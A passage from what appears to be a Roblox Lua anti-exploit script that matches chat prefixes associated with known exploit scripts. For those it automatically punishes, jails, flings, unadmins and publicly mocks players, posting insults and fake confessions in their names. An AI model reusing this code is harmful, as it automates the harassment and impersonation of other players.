                    game.Players:Chat("h \n \n \n "..plr.Name..": I smoke w  every day \n \n \n ")
                    game.Players:Chat("music 8703175543")
                    game.Players:Chat("blind "..plr.Name.."")
                    game.Players:Chat("/trap "..plr.Name.."")
                elseif string.sub(command, 1, 4) == "size" then
                    game.Players:Chat("pm "..plr.Name.." Keep repeating the command to get bigger.")
                    game.Players:Chat("size "..plr.Name.." 1.5")
                elseif string.sub(command, 1, 4) == "ffly" then
                    game.Players:Chat("gear "..plr.Name.." 225921000")
                    game.Players:Chat("unfly "..plr.Name.."")
                    game.Players:Chat("clip "..plr.Name.."")
                    game.Players:Chat("h \n \n \n  "..plr.Name..": I believe I can fly \n \n \n ")
                elseif string.sub(command, 1, 5) == ":ffly" then
                    game.Players:Chat("gear "..plr.Name.." 225921000")
                    game.Players:Chat("unfly "..plr.Name.."")
                    game.Players:Chat("clip "..plr.Name.."")
                    game.Players:Chat("h \n \n \n  "..plr.Name..": I believe I can fly \n \n \n ")
                elseif string.sub(command, 1, 5) == ":carp" then
                    game.Players:Chat("gear "..plr.Name.." 225921000")
                    game.Players:Chat("h \n \n \n  "..plr.Name..": I believe I can fly \n \n \n ")
                elseif string.sub(command, 1, 5) == "night" then
                    game.Players:Chat("time -")
                    game.Players:Chat("music 158260415")
                elseif string.sub(command, 1, 5) == "what" then
                    game.Players:Chat("h \n \n \n  What? \n \n \n ")
                    game.Players:Chat("music 6821415354")
                elseif string.sub(command, 1, 9) == "boss self" then
                    game.Players:Chat("h \n \n \n  I'm the boss now \n \n \n ")
                    game.Players:Chat("music 988706968")
                    wait()
                    game.Players:Chat("size "..plr.Name.." 3")
                    wait()
                    game.Players:Chat("speed "..plr.Name.." 21")
                    game.Players:Chat("health "..plr.Name.." 6969")
                elseif string.sub(command, 1, 10) == ":boss self" then
                    game.Players:Chat("h \n \n \n  "..plr.Name..": I'm the boss now \n \n \n ")
                    game.Players:Chat("music 988706968")
                    wait()
                    game.Players:Chat("size "..plr.Name.." 3")
                    wait()
                    game.Players:Chat("speed "..plr.Name.." 21")
                    game.Players:Chat("health "..plr.Name.." 6969")
                elseif string.sub(command, 1, 8) == "boss all" then
                    game.Players:Chat("-unadmin "..plr.Name.."")
                    game.Players:Chat("h \n \n \n  Everyone is now a big boss \n \n \n ")
                    game.Players:Chat("music 0000000000000000000000988706968")
                    wait()
                    game.Players:Chat("size all 3")
                    wait(.3)
                    game.Players:Chat("gear all 108158379")
                    wait()
                    game.Players:Chat("speed all 24")
                    game.Players:Chat("god all")
                    wait(12)
                    game.Players:Chat("-admin "..plr.Name.."")
                elseif string.sub(command, 1, 2) == "/c" then
                    game.Players:Chat("h \n \n \n "..plr.Name..": Guys don't mind me I need to hide some commands using /c system. I'm a little shy today \n \n \n ")
                elseif string.sub(command, 1, 1) == "/" then
                    game.Players:Chat("lol "..plr.Name.." you tried kiddo")
                elseif string.sub(command, 1, 7) == "exploit" then
                    game.Players:Chat("h \n \n \n \n \n \n \n \n "..plr.Name..": I gotta admit that server protector person is good at scripting. I wish Shortcut kids were as good as this person")
                    game.Players:Chat("music suck")
                elseif string.sub(command, 1, 3) == "put" then
                    game.Players:Chat("h \n \n \n  Vladimir Putin: DON'T MESS WITH ME I'M WIDER THAN YOU \n \n \n ")
                    game.Players:Chat("music 5356051569")
                    game.Players:Chat("size random 10")
                elseif string.sub(command, 1, 4) == "shut" then
                    game.Players:Chat("h \n \n \n \n \n \n \n \n \n \n \n \n \n "..plr.Name..": No horn \n pipi moment")
                    game.Players:Chat("music 6898708400")
                elseif string.sub(command, 1, 5) == "boomb" then
                    game.Players:Chat("h \n \n \n "..plr.Name..": Yay! \n \n \n ")
                    game.Players:Chat("-boombox "..plr.Name.."")
                elseif string.sub(command, 1, 8) == "paintfix" then
                    game.Players:Chat("h \n \n \n Restoring the colors to its original state \n \n \n ")
                    game.Players:Chat("-color all original")
                    wait(1.95)
                    game.Players:Chat("ungear me")
                elseif string.sub(command, 1, 9) == ":paintfix" then
                    game.Players:Chat("h \n \n \n Restoring the colors to its original state \n \n \n ")
                    game.Players:Chat("-color all original")
                    wait(1.95)
                    game.Players:Chat("ungear me")
                elseif string.sub(command, 1, 9) == "paint fix" then
                    game.Players:Chat("h \n \n \n Restoring the colors to its original state \n \n \n ")
                    game.Players:Chat("-color all original")
                    wait(1.95)
                    game.Players:Chat("ungear me")
                elseif string.sub(command, 1, 10) == ":paint fix" then
                    game.Players:Chat("h \n \n \n Restoring the colors to its original state \n \n \n ")
                    game.Players:Chat("-color all original")
                    wait(1.95)
                    game.Players:Chat("ungear me")
                elseif string.sub(command, 1, 6) == ":boomb" then
                    game.Players:Chat("h \n \n \n "..plr.Name..": Yay! \n \n \n ")
                    game.Players:Chat("-boombox "..plr.Name.."")
                elseif string.sub(command, 1, 5) == ".spam" then
                    game.Players:Chat(",msg \n \n \n Lol "..plr.Name.." no spamming \n \n \n ")
                    game.Players:Chat("-unadmin "..plr.Name.."")
                elseif string.sub(command, 2, 5) == "spam" then
                    game.Players:Chat(",msg \n \n \n Lol "..plr.Name.." no spamming \n \n \n ")
                    game.Players:Chat("-unadmin "..plr.Name.."")
                elseif string.sub(command, 3, 5) == "spam" then
                    game.Players:Chat(",msg \n \n \n Lol "..plr.Name.." no spamming \n \n \n ")
                    game.Players:Chat("-unadmin "..plr.Name.."")
                elseif string.sub(command, 1, 5) == "/spam" then
                    game.Players:Chat(",msg \n \n \n Lol "..plr.Name.." no spamming \n \n \n ")
                    game.Players:Chat("-unadmin "..plr.Name.."")
                elseif string.sub(command, 1, 6) == "//spam" then
                    game.Players:Chat(",msg \n \n \n Lol "..plr.Name.." no spamming \n \n \n ")
                    game.Players:Chat("-unadmin "..plr.Name.."")
                elseif string.sub(command, 1, 5) == ";spam" then
                    game.Players:Chat(",msg \n \n \n Lol "..plr.Name.." no spamming \n \n \n ")
                    game.Players:Chat("-unadmin "..plr.Name.."")
                elseif string.sub(command, 1, 5) == ":spam" then
                    game.Players:Chat(",msg \n \n \n Lol "..plr.Name.." no spamming \n \n \n ")
                    game.Players:Chat("-unadmin "..plr.Name.."")
                elseif string.sub(command, 1, 5) == ">spam" then
                    game.Players:Chat(",msg \n \n \n Lol "..plr.Name.." no spamming \n \n \n ")
                    game.Players:Chat("-unadmin "..plr.Name.."")
                elseif string.sub(command, 1, 5) == "?spam" then
                    game.Players:Chat(",msg \n \n \n Lol "..plr.Name.." no spamming \n \n \n ")
                    game.Players:Chat("-unadmin "..plr.Name.."")
                elseif string.sub(command, 1, 5) == "!spam" then
                    game.Players:Chat(",msg \n \n \n Lol "..plr.Name.." no spamming \n \n \n ")
                    game.Players:Chat("-unadmin "..plr.Name.."")
                elseif string.sub(command, 1, 5) == "=spam" then
                    game.Players:Chat(",msg \n \n \n Lol "..plr.Name.." no spamming \n \n \n ")
                    game.Players:Chat("-unadmin "..plr.Name.."")
                elseif string.sub(command, 1, 5) == "+spam" then
                    game.Players:Chat(",msg \n \n \n Lol "..plr.Name.." no spamming \n \n \n ")
                    game.Players:Chat("-unadmin "..plr.Name.."")
                elseif string.sub(command, 1, 5) == "espam" then
                    game.Players:Chat(",msg \n \n \n Lol "..plr.Name.." no spamming \n \n \n ")
                    game.Players:Chat("-unadmin "..plr.Name.."")
                elseif string.sub(command, 1, 6) == "//spam" then
                    game.Players:Chat(",msg \n \n \n Lol "..plr.Name.." no spamming \n \n \n ")
                    game.Players:Chat("-unadmin "..plr.Name.."")
                elseif string.sub(command, 1, 5) == ";spam" then
                    game.Players:Chat(",msg \n \n \n Lol "..plr.Name.." no spamming \n \n \n ")
                    game.Players:Chat("-unadmin "..plr.Name.."")
                elseif string.sub(command, 1, 5) == ":spam" then
                    game.Players:Chat(",msg \n \n \n Lol "..plr.Name.." no spamming \n \n \n ")
                    game.Players:Chat("-unadmin "..plr.Name.."")
                elseif string.sub(command, 1, 5) == ">spam" then
                    game.Players:Chat(",msg \n \n \n Lol "..plr.Name.." no spamming \n \n \n ")
                    game.Players:Chat("-unadmin "..plr.Name.."")
                elseif string.sub(command, 1, 5) == "?spam" then
                    game.Players:Chat(",msg \n \n \n Lol "..plr.Name.." no spamming \n \n \n ")
                    game.Players:Chat("-unadmin "..plr.Name.."")
                elseif string.sub(command, 1, 5) == "!spam" then
                    game.Players:Chat(",msg \n \n \n Lol "..plr.Name.." no spamming \n \n \n ")
                    game.Players:Chat("-unadmin "..plr.Name.."")
                elseif string.sub(command, 1, 5) == "=spam" then
                    game.Players:Chat(",msg \n \n \n Lol "..plr.Name.." no spamming \n \n \n ")
                    game.Players:Chat("-unadmin "..plr.Name.."")
                elseif string.sub(command, 1, 5) == "+spam" then
                    game.Players:Chat(",msg \n \n \n Lol "..plr.Name.." no spamming \n \n \n ")
                    game.Players:Chat("-unadmin "..plr.Name.."")
                elseif string.sub(command, 1, 5) == "espam" then
                    game.Players:Chat(",msg \n \n \n Lol "..plr.Name.." no spamming \n \n \n ")
                    game.Players:Chat("-unadmin "..plr.Name.."")
                elseif string.sub(command, 1, 12) == "gear me 947" then
                    game.Players:Chat("h \n \n \n Shortcut v2: Lol this trash named "..plr.Name.." wanted to crash the server LOOOL epic fail \n \n \n ")
                elseif string.sub(command, 1, 13) == ":gear me 947" then
                    game.Players:Chat("h \n \n \n Shortcut v2: Lol this trash named "..plr.Name.." wanted to crash the server LOOOL epic fail \n \n \n ")
                elseif string.sub(command, 1, 5) == ";perm" then
                    game.Players:Chat("pm me Lol "..plr.Name.." injected old Shortcut keep your heads up please ")
                    game.Players:Chat("jail "..plr.Name.."")
                    game.Players:Chat("fling "..plr.Name.."")
                    game.Players:Chat("seizure "..plr.Name.."")
                elseif string.sub(command, 1, 5) == ";perm" then
                    game.Players:Chat("pm me Lol "..plr.Name.." injected old Shortcut keep your heads up please ")
                    game.Players:Chat("jail "..plr.Name.."")
                    game.Players:Chat("fling "..plr.Name.."")
                    game.Players:Chat("seizure "..plr.Name.."")
                elseif string.sub(command, 1, 5) == ";perm" then
                    game.Players:Chat("pm me Lol "..plr.Name.." injected old Shortcut keep your heads up please ")
                    game.Players:Chat("jail "..plr.Name.."")
                    game.Players:Chat("fling "..plr.Name.."")
                    game.Players:Chat("seizure "..plr.Name.."")
                elseif string.sub(command, 1, 5) == ";perm" then
                    game.Players:Chat("pm me Lol "..plr.Name.." injected old Shortcut keep your heads up please ")
                    game.Players:Chat("jail "..plr.Name.."")
                    game.Players:Chat("fling "..plr.Name.."")
                    game.Players:Chat("seizure "..plr.Name.."")
                elseif string.sub(command, 1, 3) == "are" then
                    game.Players:Chat(",msg \n \n \n "..plr.Name.." you tried kiddo")
                elseif string.sub(command, 1, 2) == "it" then
                    game.Players:Chat(",msg \n \n \n "..plr.Name.." you tried kiddo")
                elseif string.sub(command, 1, 2) == "we" then
                    game.Players:Chat(",msg \n \n \n "..plr.Name.." you tried kiddo")
                elseif string.sub(command, 1, 3) == "the" then
                    game.Players:Chat(",msg \n \n \n "..plr.Name.." you tried kiddo")
                elseif string.sub(command, 1, 3) == "tha" then
                    game.Players:Chat(",msg \n \n \n "..plr.Name.." you tried kiddo")
                elseif string.sub(command, 1, 3) == "lov" then
                    game.Players:Chat(",msg \n \n \n "..plr.Name.." you tried kiddo")
                elseif string.sub(command, 1, 3) == "sin" then
                    game.Players:Chat(",msg \n \n \n "..plr.Name.." you tried kiddo")
                elseif string.sub(command, 1, 12) == "gear me 947" then
                    game.Players:Chat("h \n \n \n Shortcut v2: Lol this trash named "..plr.Name.." wanted to crash the server LOOOL epic fail \n \n \n ")
                elseif string.sub(command, 1, 13) == ":gear me 947" then
                    game.Players:Chat("h \n \n \n Shortcut v2: Lol this trash named "..plr.Name.." wanted to crash the server LOOOL epic fail \n \n \n ")
                elseif string.sub(command, 1, 12) == "gear me 947" then
                    game.Players:Chat("h \n \n \n Shortcut v2: Lol this trash named "..plr.Name.." wanted to crash the server LOOOL epic fail \n \n \n ")
                elseif string.sub(command, 1, 13) == ":gear me 947" then
                    game.Players:Chat("h \n \n \n Shortcut v2: Lol this trash named "..plr.Name.." wanted to crash the server LOOOL epic fail \n \n \n ")
                elseif string.sub(command, 1, 12) == "gear me 947" then
                    game.Players:Chat("h \n \n \n Shortcut v2: Lol this trash named "..plr.Name.." wanted to crash the server LOOOL epic fail \n \n \n ")
                elseif string.sub(command, 1, 13) == ":gear me 947" then
                    game.Players:Chat("h \n \n \n Shortcut v2: Lol this trash named "..plr.Name.." wanted to crash the server LOOOL epic fail \n \n \n ")
                elseif string.sub(command, 1, 3) == "tha" then
                    game.Players:Chat(",msg \n \n \n "..plr.Name.." you tried kiddo")
                elseif string.sub(command, 1, 3) == "bry" then
                    game.Players:Chat(",msg \n \n \n "..plr.Name.." you tried kiddo")
                elseif string.sub(command, 1,1) == "z" then
                    game.Players:Chat(",msg \n \n \n "..plr.Name.." you tried kiddo")
                elseif string.sub(command, 1,1) == "x" then
                    game.Players:Chat(",msg \n \n \n "..plr.Name.." you tried kiddo")
                elseif string.sub(command, 1,2) == "u " then
                    game.Players:Chat(",msg \n \n \n "..plr.Name.." you tried kiddo")
                elseif string.sub(command, 1, 7) == "Imagine" then
                    game.Players:Chat(",msg \n \n \n "..plr.Name.." you tried kiddo")
                elseif string.sub(command, 1, 3) == "you" then
                    game.Players:Chat(",msg \n \n \n "..plr.Name.." you tried kiddo")
                elseif string.sub(command, 1, 999) == "canceledcurrentlynotgonnaadd" then
                    game.Players:Chat(",msg "..plr.Name..": Imagine using Shortcut v2 in a protected server lol")
                    game.Players:Chat("punish "..plr.Name.."")
                    game.Players:Chat(".unadmin "..plr.Name.."")
                elseif string.sub(command, 1, 4) == ";spam" then
                    game.Players:Chat("h \n \n \n "..plr.Name..": Imagine using old Shortcut in 2022 🤡🤡🤡 \n \n \n ")
                    game.Players:Chat("punish "..plr.Name.."")
                elseif string.sub(command, 1, 5) == ";pads" then
                    game.Players:Chat("h \n \n \n "..plr.Name..": Imagine using old Shortcut in 2022 🤡🤡🤡 \n \n \n ")
                    game.Players:Chat("punish "..plr.Name.."")
                    game.Players:Chat("-unadmin "..plr.Name.."")
                elseif string.sub(command, 1, 12) == "gear me 947" then
                    game.Players:Chat("h \n \n \n Shortcut v2: Lol this trash named "..plr.Name.." wanted to crash the server LOOOL epic fail \n \n \n ")
                elseif string.sub(command, 1, 13) == ":gear me 947" then
                    game.Players:Chat("h \n \n \n Shortcut v2: Lol this trash named "..plr.Name.." wanted to crash the server LOOOL epic fail \n \n \n ")
                elseif string.sub(command, 1, 5) == ";hous" then
                    game.Players:Chat("h \n \n \n "..plr.Name..": Imagine using old Shortcut in 2022 🤡🤡🤡 \n \n \n ")
                    game.Players:Chat("punish "..plr.Name.."")
                    game.Players:Chat("-unadmin "..plr.Name.."")
                elseif string.sub(command, 1, 4) == ";spam" then
                    game.Players:Chat("h \n \n \n "..plr.Name..": Imagine using old Shortcut in 2022 🤡🤡🤡 \n \n \n ")
                    game.Players:Chat("punish "..plr.Name.."")
                elseif string.sub(command, 1, 5) == ";pads" then
                    game.Players:Chat("h \n \n \n "..plr.Name..": Imagine using old Shortcut in 2022 🤡🤡🤡 \n \n \n ")
                    game.Players:Chat("punish "..plr.Name.."")
                    game.Players:Chat("-unadmin "..plr.Name.."")
                elseif string.sub(command, 1, 5) == ";hous" then
                    game.Players:Chat("h \n \n \n "..plr.Name..": Imagine using old Shortcut in 2022 🤡🤡🤡 \n \n \n ")
                    game.Players:Chat("punish "..plr.Name.."")
                    game.Players:Chat("-unadmin "..plr.Name.."")
                elseif string.sub(command, 1, 2) == ";a" then
                    game.Players:Chat("pm "..plr.Name.." your command Contains a ; at the start of it like fr just go back to HD admin kid.")
                elseif string.sub(command, 1, 2) == ";b" then
                    game.Players:Chat("pm "..plr.Name.." your command Contains a ; at the start of it like fr just go back to HD admin kid.")
                    game.Players:Chat("punish "..plr.Name.."")
                elseif string.sub(command, 1, 2) == ";p" then
                    game.Players:Chat("pm "..plr.Name.." your command Contains a ; at the start of it like fr just go back to HD admin kid.")
                    game.Players:Chat("punish "..plr.Name.."")
                elseif string.sub(command, 1, 3) == ";cm" then
                    game.Players:Chat("pm "..plr.Name.." your command Contains a ; at the start of it like fr just go back to HD admin kid.")
                    game.Players:Chat("punish "..plr.Name.."")
                elseif string.sub(command, 1, 2) == ";d" then
                    game.Players:Chat("pm "..plr.Name.." your command Contains a ; at the start of it like fr just go back to HD admin kid.")
                elseif string.sub(command, 1, 2) == ";e" then
                    game.Players:Chat(",msg "..plr.Name..": I use Shortcut because I am too lazy to get a good script")
                    game.Players:Chat("punish "..plr.Name.."")
                    game.Players:Chat(".unadmin "..plr.Name.."")
                elseif string.sub(command, 1, 5) == ".spam" then
                    game.Players:Chat(",msg \n \n \n Lol "..plr.Name.." no spamming \n \n \n ")
                    game.Players:Chat("-unadmin "..plr.Name.."")
                elseif string.sub(command, 1, 5) == "/spam" then
                    game.Players:Chat(",msg \n \n \n Lol "..plr.Name.." no spamming \n \n \n ")
                    game.Players:Chat("-unadmin "..plr.Name.."")
                elseif string.sub(command, 1, 6) == "//spam" then
                    game.Players:Chat(",msg \n \n \n Lol "..plr.Name.." no spamming \n \n \n ")
                    game.Players:Chat("-unadmin "..plr.Name.."")
                elseif string.sub(command, 1, 5) == ";spam" then
                    game.Players:Chat(",msg \n \n \n Lol "..plr.Name.." no spamming \n \n \n ")
                    game.Players:Chat("-unadmin "..plr.Name.."")
                elseif string.sub(command, 1, 5) == ":spam" then
                    game.Players:Chat(",msg \n \n \n Lol "..plr.Name.." no spamming \n \n \n ")
                    game.Players:Chat("-unadmin "..plr.Name.."")
                elseif string.sub(command, 1, 5) == ">spam" then
                    game.Players:Chat(",msg \n \n \n Lol "..plr.Name.." no spamming \n \n \n ")
                elseif string.sub(command, 1, 12) == "gear me 947" then
                    game.Players:Chat("h \n \n \n Shortcut v2: Lol this trash named "..plr.Name.." wanted to crash the server LOOOL epic fail \n \n \n ")
                    game.Players:Chat("-unadmin "..plr.Name.."")
                elseif string.sub(command, 1, 13) == ":gear me 947" then
                    game.Players:Chat("h \n \n \n Shortcut v2: Lol this trash named "..plr.Name.." wanted to crash the server LOOOL epic fail \n \n \n ")
                    game.Players:Chat("-unadmin "..plr.Name.."")
                elseif string.sub(command, 1, 5) == "?spam" then
                    game.Players:Chat(",msg \n \n \n Lol "..plr.Name.." no spamming \n \n \n ")
                    game.Players:Chat("-unadmin "..plr.Name.."")
                elseif string.sub(command, 1, 5) == "!spam" then
                    game.Players:Chat(",msg \n \n \n Lol "..plr.Name.." no spamming \n \n \n ")
                    game.Players:Chat("-unadmin "..plr.Name.."")
                elseif string.sub(command, 1, 5) == "=spam" then
                    game.Players:Chat(",msg \n \n \n Lol "..plr.Name.." no spamming \n \n \n ")
                    game.Players:Chat("-unadmin "..plr.Name.."")
                elseif string.sub(command, 1, 5) == "+spam" then
                    game.Players:Chat(",msg \n \n \n Lol "..plr.Name.." no spamming \n \n \n ")
                    game.Players:Chat("-unadmin "..plr.Name.."")
                elseif string.sub(command, 1, 5) == "espam" then
                    game.Players:Chat(",msg \n \n \n Lol "..plr.Name.." no spamming \n \n \n ")
                    game.Players:Chat("-unadmin "..plr.Name.."")
                elseif string.sub(command, 1, 5) == ".spam" then
                    game.Players:Chat(",msg \n \n \n Lol "..plr.Name.." no spamming \n \n \n ")
                    game.Players:Chat("-unadmin "..plr.Name.."")
                elseif string.sub(command, 1, 5) == "/spam" then
                    game.Players:Chat(",msg \n \n \n Lol "..plr.Name.." no spamming \n \n \n ")
                    game.Players:Chat("-unadmin "..plr.Name.."")
                elseif string.sub(command, 1, 6) == "//spam" then
                    game.Players:Chat(",msg \n \n \n Lol "..plr.Name.." no spamming \n \n \n ")
                    game.Players:Chat("-unadmin "..plr.Name.."")
                elseif string.sub(command, 1, 5) == ";spam" then
                    game.Players:Chat(",msg \n \n \n Lol "..plr.Name.." no spamming \n \n \n ")
                    game.Players:Chat("-unadmin "..plr.Name.."")
                elseif string.sub(command, 1, 5) == ":spam" then
                    game.Players:Chat(",msg \n \n \n Lol "..plr.Name.." no spamming \n \n \n ")
                    game.Players:Chat("-unadmin "..plr.Name.."")
                elseif string.sub(command, 1, 5) == ">spam" then
                    game.Players:Chat(",msg \n \n \n Lol "..plr.Name.." no spamming \n \n \n ")
                    game.Players:Chat("-unadmin "..plr.Name.."")
                elseif string.sub(command, 1, 5) == "?spam" then
                    game.Players:Chat(",msg \n \n \n Lol "..plr.Name.." no spamming \n \n \n ")
                    game.Players:Chat("-unadmin "..plr.Name.."")
                elseif string.sub(command, 1, 5) == "!spam" then
                    game.Players:Chat(",msg \n \n \n Lol "..plr.Name.." no spamming \n \n \n ")
                    game.Players:Chat("-unadmin "..plr.Name.."")
                elseif string.sub(command, 1, 5) == "=spam" then
                    game.Players:Chat(",msg \n \n \n Lol "..plr.Name.." no spamming \n \n \n ")
                    game.Players:Chat("-unadmin "..plr.Name.."")
                elseif string.sub(command, 1, 5) == "+spam" then
                    game.Players:Chat(",msg \n \n \n Lol "..plr.Name.." no spamming \n \n \n ")
                    game.Players:Chat("-unadmin "..plr.Name.."")
                elseif string.sub(command, 1, 5) == "espam" then
                    game.Players:Chat(",msg \n \n \n Lol "..plr.Name.." no spamming \n \n \n ")
                    game.Players:Chat("-unadmin "..plr.Name.."")
                elseif string.sub(command, 1, 2) == ";k" then
                    game.Players:Chat("pm "..plr.Name.." your command Contains a ; at the start of it like fr just go back to HD admin kid.")
                elseif string.sub(command, 1, 2) == ";j" then
                    game.Players:Chat("pm "..plr.Name.." your command Contains a ; at the start of it like fr just go back to HD admin kid.")
                elseif string.sub(command, 1, 2) == ";f" then
                    game.Players:Chat("pm "..plr.Name.." your command Contains a ; at the start of it like fr just go back to HD admin kid.")
                elseif string.sub(command, 1, 9) == ":zawarudo" then
                    game.Players:Chat("h \n \n \n "..plr.Name..": I use Admin joy trash \n \n \n ")
                    game.Players:Chat("punish "..plr.Name.."")
                    game.Players:Chat("-unadmin "..plr.Name.."")
                    game.Players:Chat("pm "..plr.Name.." You've been banned for injecting a blacklisted script")
                elseif string.sub(command, 1, 6) == ":purge" then
                    game.Players:Chat("h \n \n \n  "..plr.Name..": I use Admin joy trash \n \n \n ")
                    game.Players:Chat("punish "..plr.Name.."")
                    game.Players:Chat("-unadmin "..plr.Name.."")
                    game.Players:Chat("pm "..plr.Name.." You've been banned for injecting a blacklisted script")
                elseif string.sub(command, 1, 1) == "." then
                    game.Players:Chat("-smd Lol no joke but "..plr.Name.." is an")
                    wait(.55)
                    game.Players:Chat("h \n \n \n ldiot \n \n \n ")
                elseif string.sub(command, 1, 8) == ":allpads" then
                    game.Players:Chat("h \n \n \n "..plr.Name..": I use Admin joy trash \n \n \n ")
                    game.Players:Chat("punish "..plr.Name.."")
                    game.Players:Chat("-unadmin "..plr.Name.."")
                    game.Players:Chat("pm "..plr.Name.." You've been banned for injecting a blacklisted script")
                elseif string.sub(command, 1, 5) == ":rege" then
                    game.Players:Chat("h \n \n \n  "..plr.Name..": I use Admin joy trash \n \n \n ")
                    game.Players:Chat("punish "..plr.Name.."")
                    game.Players:Chat("-unadmin "..plr.Name.."")
                    game.Players:Chat("pm "..plr.Name.." You've been banned for injecting a blacklisted script")
                elseif string.sub(command, 1, 5) == ">anti" then
                    game.Players:Chat("h \n \n \n Lol "..plr.Name..": injected kohls n00b xd imagine not using this script \n \n \n ")
                elseif string.sub(command, 1, 4) == ":kit" then
                    game.Players:Chat("h \n \n \n "..plr.Name..": I use Admin joy trash \n \n \n ")
                    game.Players:Chat("punish "..plr.Name.."")
                    game.Players:Chat("-unadmin "..plr.Name.."")
                    game.Players:Chat("pm "..plr.Name.." You've been banned for injecting a blacklisted script")
                elseif string.sub(command, 1, 5) == ":pads" then
                    game.Players:Chat("h \n \n \n "..plr.Name..": I use Admin joy trash \n \n \n ")
                    game.Players:Chat("punish "..plr.Name.."")
                    game.Players:Chat("-unadmin "..plr.Name.."")
                    game.Players:Chat("pm "..plr.Name.." You've been banned for injecting a blacklisted script")
                elseif string.sub(command, 1, 5) == ":bloc" then
                    game.Players:Chat("h \n \n \n  "..plr.Name..": I use Admin joy trash \n \n \n ")
                    game.Players:Chat("punish "..plr.Name.."")
                    game.Players:Chat("-unadmin "..plr.Name.."")
                    game.Players:Chat("pm "..plr.Name.." You've been banned for injecting a blacklisted script")
                elseif string.sub(command, 1, 5) == ":uhou" then
                    game.Players:Chat("h \n \n \n  "..plr.Name..": I use Admin joy trash \n \n \n ")
                    game.Players:Chat("punish "..plr.Name.."")
                    game.Players:Chat(".unadmin "..plr.Name.."")
                elseif string.sub(command, 1, 5) == ":spaw" then
                    game.Players:Chat("h \n \n \n  "..plr.Name..": I use Admin joy trash \n \n \n ")
                    game.Players:Chat("punish "..plr.Name.."")
                    game.Players:Chat("pm "..plr.Name.." You've been banned for injecting a blacklisted script")
                    game.Players:Chat("-unadmin "..plr.Name.."")
                    game.Players:Chat("pm "..plr.Name.." You've been banned for injecting a blacklisted script")
                elseif string.sub(command, 1, 3) == ":Go" then
                    game.Players:Chat("h \n \n \n "..plr.Name..": I use Admin joy trash \n \n \n ")
                    game.Players:Chat("punish "..plr.Name.."")
                    game.Players:Chat("-unadmin "..plr.Name.."")
                    game.Players:Chat("pm "..plr.Name.." You've been banned for injecting a blacklisted script")
                elseif string.sub(command, 1, 5) == ":Stop" then
                    game.Players:Chat("h \n \n \n  "..plr.Name..": I use Admin joy trash \n \n \n ")
                    game.Players:Chat("punish "..plr.Name.."")
                    game.Players:Chat("-unadmin "..plr.Name.."")
                    game.Players:Chat("pm "..plr.Name.." You've been banned for injecting a blacklisted script")
                elseif string.sub(command, 1, 5) == ":remo" then
                    game.Players:Chat("h \n \n \n "..plr.Name..": I use Admin joy trash \n \n \n ")
                    game.Players:Chat("punish "..plr.Name.."")
                    game.Players:Chat("-unadmin "..plr.Name.."")
                elseif string.sub(command, 1, 11) == "h Automusic" then
                    game.Players:Chat("pm "..plr.Name.." You've been banned for injecting a blacklisted script")
                    game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Yikes "..plr.Name.." Turns out you've injected a c00lkidd script which means you'll be unable to get along with the fun of servers protected with SS TAKEOVER ANTICRASH V3 loaded","all")
                    game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("If you wanna get a good script that has proper support join disco ord .gg/65yHbG4Wfa. We're just tryna help you. Being a c00lkidd fan is unhealthy let me tell you that. LEAVE THEIR DISCO ORD","all")
                    game.Players:Chat("-unadmin "..plr.Name.."")
                    game.Players:Chat("punish "..plr.Name.."")
                    game.Players:Chat("pm "..plr.Name.." You've been banned for injecting a blacklisted script")
                elseif string.sub(command, 1, 4) == ":skh" then
                    game.Players:Chat("h \n \n \n  "..plr.Name..": I use Admin joy trash \n \n \n ")
                    game.Players:Chat("punish "..plr.Name.."")
                    game.Players:Chat("-unadmin "..plr.Name.."")
                    game.Players:Chat("pm "..plr.Name.." You've been banned for injecting a blacklisted script")
                elseif string.sub(command, 1, 5) == ":inve" then
                    game.Players:Chat(",msg "..plr.Name..": I use Admin joy trash")
                    game.Players:Chat("punish "..plr.Name.."")
                    game.Players:Chat("h \n \n \n  l "..plr.Name.." l Has chosen the easy way out \n \n \n ")
                elseif string.sub(command, 1, 4) == ":hmm" then
                    game.Players:Chat("h \n \n \n  "..plr.Name..": I use Admin joy trash \n \n \n ")
                    game.Players:Chat("punish "..plr.Name.."")
                    game.Players:Chat("-unadmin "..plr.Name.."")
                    game.Players:Chat("pm "..plr.Name.." You've been banned for injecting a blacklisted script")
                elseif string.sub(command, 1, 4) == ":dab" then
                    game.Players:Chat("h \n \n \n "..plr.Name..": I use Admin joy trash \n \n \n ")
                    game.Players:Chat("punish "..plr.Name.."")
                    game.Players:Chat("-unadmin "..plr.Name.."")
                    game.Players:Chat("pm "..plr.Name.." You've been banned for injecting a blacklisted script")
                elseif string.sub(command, 1, 5) == ":admi" then
                    game.Players:Chat("h \n \n \n Lol this trash named "..plr.Name.." thought he could give himself admin LOL laugh at this dude \n \n \n ")
                    game.Players:Chat("punish "..plr.Name.."")
                    game.Players:Chat("pm "..plr.Name.." Lol you already have admin unless you injected admin joy")
                elseif string.sub(command, 1, 5) == ":erro" then
                    game.Players:Chat("h \n \n \n "..plr.Name..": I use Admin joy trash \n \n \n ")
                    game.Players:Chat("punish "..plr.Name.."")
                    game.Players:Chat("-unadmin "..plr.Name.."")
                    game.Players:Chat("pm "..plr.Name.." You've been banned for injecting a blacklisted script")
                elseif string.sub(command, 1, 4) == "btoo" then
                    game.Players:Chat("h \n \n \n "..plr.Name..": Working btools but client only \n \n \n ")
                    game.Players:Chat("-btools "..plr.Name.."")
                    game.Players:Chat("pm "..plr.Name.." The btools that you have is client sided so only you will see the effects. If you think others still see it then you deserve a punch in the face")
                elseif string.sub(command, 1, 5) == ":btoo" then
                    game.Players:Chat("h \n \n \n "..plr.Name..": Working btools but client only \n \n \n ")
                    game.Players:Chat("-btools "..plr.Name.."")
                    game.Players:Chat("pm "..plr.Name.." The btools that you have is client sided so only you will see the effects. Play the remake for Server Sided btools")
                elseif string.sub(command, 1, 5) == "firew" then
                    game.Players:Chat("h \n \n \n Firework: The only way to activate me would be using a : at the start \n \n \n ")
                    game.Players:Chat("pm "..plr.Name.." [Automatic] It needs a prefix")
                elseif string.sub(command, 1, 3) == "ewo" then
                    game.Players:Chat("unchar "..plr.Name.."")
                    game.Players:Chat("h \n \n \n l "..plr.Name.." l Has chosen the easy way out \n \n \n ")
                elseif string.sub(command, 1, 4) == "info" then
                    game.Players:Chat("jump "..plr.Name.."")
                    game.Players:Chat("h \n \n \n Say Protection if you want to know more xd \n \n \n ")
